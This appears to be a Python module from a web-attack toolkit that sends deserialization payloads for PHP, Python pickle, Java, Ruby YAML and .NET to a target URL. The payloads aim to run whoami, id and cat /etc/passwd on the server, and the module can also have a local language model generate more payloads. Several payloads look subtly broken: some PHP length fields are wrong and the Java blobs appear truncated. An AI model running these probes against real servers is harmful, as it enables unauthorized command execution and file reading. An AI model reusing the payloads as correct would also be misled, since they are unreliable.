import re
import json
import base64
import requests
from urllib.parse import urlparse
from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

# PHP serialized object
PHP_PAYLOADS = [
    'O:7:"Example":1:{s:3:"cmd";s:6:"whoami";}',
    'O:7:"Example":1:{s:3:"cmd";s:2:"id";}',
    'O:7:"Example":1:{s:3:"cmd";s:8:"cat /etc/passwd";}',
    'a:1:{i:0;O:7:"Example":1:{s:3:"cmd";s:2:"id";}}',
    'O:10:"FileReader":1:{s:4:"file";s:11:"/etc/passwd";}',
    'O:10:"FileReader":1:{s:4:"file";s:15:"/windows/win.ini";}',
]

# Python pickle payloads
PICKLE_PAYLOADS = [
    "gASVIQAAAAAAAABMBXBvc2l4lIwGc3lzdGVtlJOUjAR3aG9hbWmUhZRSlC4=",
    "gASVKQAAAAAAAABMCnN1YnByb2Nlc3OUjARQSU5GlJOUjANscy5UpZSFlFKULg==",
]

# Java serialized base64 (ysoserial-style)
JAVA_PAYLOADS = [
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAALcmVxdWVzdGVkT2Jq",
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAR",
]

# Ruby YAML payloads
RUBY_YAML_PAYLOADS = [
    "--- !ruby/object:Shell\ntest: id\n",
    "--- !ruby/object:Sprintf\nformat: \"id\"\n",
]

# .NET PowerShell payloads
DOTNET_PAYLOADS = [
    "<<Object[]>> <<PSObject>> @{__GUID='powershell -Command id'}",
]

# Magic bytes for detection
PHP_MAGIC = [b"O:", b'a:']
PICKLE_MAGIC = [b"gASV", b"\\x80\\x04"]
JAVA_MAGIC = [b"\\xac\\xed\\x00\\x05", b"rO0ABX"]
RUBY_MAGIC = [b"--- !ruby/object", b"--- !ruby/Object"]
DOTNET_MAGIC = [b"<<Object[]>>", b"<<PSObject>>"]


class InsecureDeserialization:
    name = "deserialize"
    description = "Insecure deserialization vulnerability scanner for PHP, Python, Java, Ruby, .NET"

    @staticmethod
    def run(target, param="data", method="POST", data="", content_type="", timeout=10, ollama_model=None):
        section(f"Insecure Deserialization Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None
        results = {"target": target, "vulnerabilities": [], "total_tests": 0, "findings": 0}
        all_vulns = []

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        all_payloads = (
            [{"payload": p, "lang": "PHP", "type": "PHP_SERIALIZED"} for p in PHP_PAYLOADS] +
            [{"payload": base64.b64decode(p).decode("latin-1"), "lang": "PYTHON", "type": "PICKLE"} for p in PICKLE_PAYLOADS] +
            [{"payload": base64.b64decode(p).decode("latin-1"), "lang": "JAVA", "type": "JAVA_SERIALIZED"} for p in JAVA_PAYLOADS] +
            [{"payload": p, "lang": "RUBY", "type": "YAML"} for p in RUBY_YAML_PAYLOADS] +
            [{"payload": p, "lang": "DOTNET", "type": "PSOBJECT"} for p in DOTNET_PAYLOADS]
        )

        if ollama and ollama.available:
            info("Ollama: generating deserialization payloads...")
            for lang in ["php", "python", "java"]:
                ai_payloads = ollama.generate_deserialization_payloads(lang)
                if ai_payloads:
                    for p in ai_payloads:
                        all_payloads.append({"payload": p, "lang": lang.upper(), "type": f"AI_{lang.upper()}"})
                    info(f"AI generated {len(ai_payloads)} {lang} payloads")

        content_types = []
        if content_type:
            content_types = [content_type]
        else:
            content_types = [
                "application/x-www-form-urlencoded",
                "application/json",
                "application/xml",
                "text/xml",
                "application/php-serialized",
                "application/java-serialized-object",
            ]

        info(f"Testing {len(all_payloads)} deserialization payloads across {len(content_types)} content types...")

        for ctype in content_types[:3]:
            for entry in all_payloads:
                results["total_tests"] += 1
                try:
                    payload_val = entry["payload"]
                    lang = entry["lang"]
                    vuln_type = entry["type"]

                    post_data = data or f"{param}={requests.utils.quote(payload_val)}"

                    resp = requests.post(target, data=post_data, timeout=timeout,
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "Content-Type": ctype,
                        },
                        allow_redirects=False)

                    body = resp.text.lower()
                    error_indicators = [
                        "fatal error", "uncaught exception", "unserialize", "__PHP_Incomplete_Class",
                        "pickle", "unpickling", "stacktrace", "java.lang", "exception",
                        "system(", "whoami", "uid=", "root:", "www-data",
                        "shell", "command", "executed",
                        "yaml", "syck", "psych",
                    ]

                    found_indicators = [i for i in error_indicators if i.lower() in body]
                    if found_indicators:
                        all_vulns.append({
                            "type": f"DESERIALIZATION_{vuln_type}",
                            "lang": lang,
                            "payload": payload_val[:80],
                            "content_type": ctype,
                            "evidence": f"Response contains: {', '.join(found_indicators[:3])}",
                            "status_code": resp.status_code,
                        })
                        results["findings"] += 1
                        success(f"[{vuln_type}] {lang} payload triggered ({resp.status_code}) - {', '.join(found_indicators[:2])}")

                    if resp.status_code == 500 and len(body) > 100:
                        all_vulns.append({
                            "type": f"DESERIALIZATION_500",
                            "lang": lang,
                            "payload": payload_val[:80],
                            "content_type": ctype,
                            "evidence": "Server returned 500 Internal Server Error",
                            "status_code": 500,
                        })
                        results["findings"] += 1
                        warning(f"[DESERIALIZATION_500] {lang} payload caused 500 error")

                except requests.exceptions.RequestException:
                    pass
                except Exception:
                    pass

        # Test via URL param injection
        info("Testing URL parameter deserialization...")
        for entry in all_payloads[:5]:
            results["total_tests"] += 1
            try:
                test_url = f"{target}?{param}={requests.utils.quote(entry['payload'][:50])}"
                resp = requests.get(test_url, timeout=timeout,
                    headers={"User-Agent": "Mozilla/5.0"},
                    allow_redirects=False)

                if any(i in resp.text.lower() for i in ["unserialize", "pickle", "java.lang", "exception"]):
                    all_vulns.append({
                        "type": f"DESERIALIZATION_URL_{entry['type']}",
                        "lang": entry['lang'],
                        "payload": entry['payload'][:80],
                        "evidence": "Deserialization error in response",
                        "status_code": resp.status_code,
                    })
                    results["findings"] += 1
                    success(f"[URL_DESERIALIZATION] {entry['lang']} payload via URL param ({resp.status_code})")

            except requests.exceptions.RequestException:
                pass
            except Exception:
                pass

        if all_vulns:
            result("Total vulnerabilities found", str(len(all_vulns)))

            table(["Type", "Language", "Evidence", "Status"], [
                [v["type"], v["lang"], v["evidence"][:40], str(v["status_code"])] for v in all_vulns[:20]
            ])

            if len(all_vulns) > 20:
                info(f"... and {len(all_vulns) - 20} more findings")
        else:
            warning("No insecure deserialization vulnerabilities detected")

        results["vulnerabilities"] = all_vulns
        return results
